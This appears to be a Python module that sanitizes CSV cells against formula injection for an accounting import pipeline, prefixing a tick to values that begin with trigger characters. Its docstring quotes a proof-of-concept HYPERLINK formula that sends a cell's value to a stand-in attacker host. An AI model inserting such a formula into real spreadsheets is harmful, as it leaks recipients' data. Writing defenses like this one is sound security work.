"""CSV formula-injection (a.k.a. "CSV injection" / "CWE-1236") defenses.

When a CSV cell that contains attacker-controlled text begins with one
of `=`, `+`, `-`, `@`, TAB (`\\t`), or CR (`\\r`), spreadsheet apps such as
Microsoft Excel, Google Sheets, and LibreOffice Calc interpret the cell
as a formula. The famous proof-of-concept is::

    =HYPERLINK("http://evil.example/?x="&A1, "Click me")

which leaks a sibling cell's value when the recipient opens the file.

Our pipeline does not currently send a user-facing CSV download, but it
does:

  * write a `*_qbo_import.csv` intermediate that an operator might open
    while investigating a job, and
  * accept attacker-controlled `memo` / `Description` text from PCLaw
    exports.

Sanitizing on export is therefore defense-in-depth: even if an attacker
controls the description field of a PCLaw row, opening the intermediate
CSV in Excel will treat the cell as a literal string rather than a
formula.

We prepend a single tick (`'`) — the OWASP-recommended convention. Excel
and Google Sheets both strip the leading tick on display, so the cell
still *looks* identical to the user. This intentionally does NOT corrupt
internal parsing: `csv.reader` returns the literal value (with the tick),
and our QBO write path reads the rows we built in memory, not the
re-parsed CSV.
"""

from __future__ import annotations

# Characters that Excel / Sheets / Calc treat as a formula trigger when
# they appear as the FIRST character of a cell. Tab and CR are included
# because some older Excel builds strip leading whitespace and then
# re-evaluate.
DANGEROUS_LEADING_CHARS = ("=", "+", "-", "@", "\t", "\r")


def sanitize_csv_cell(value):
    """Return a CSV-safe rendering of ``value``.

    - ``None`` becomes ``""`` so the row stays the right shape.
    - Non-string scalars (int, float, Decimal) are returned unchanged
      because csv.writer will stringify them and they cannot begin with
      a dangerous character.
    - Strings beginning with a dangerous character get a single leading
      tick prepended.

    The tick is the OWASP-recommended marker. Recipients still see the
    original text on screen.
    """
    if value is None:
        return ""
    if not isinstance(value, str):
        return value
    if not value:
        return value
    if value[0] in DANGEROUS_LEADING_CHARS:
        return "'" + value
    return value


def sanitize_csv_row(row):
    """Sanitize an iterable row in-place (returns a new list).

    Works for both list rows (used by ``csv.writer``) and dict rows
    (used by ``csv.DictWriter`` — caller passes ``dict.values()`` or
    re-builds the dict via ``{k: sanitize_csv_cell(v) for k, v in
    row.items()}``).
    """
    if isinstance(row, dict):
        return {k: sanitize_csv_cell(v) for k, v in row.items()}
    return [sanitize_csv_cell(v) for v in row]
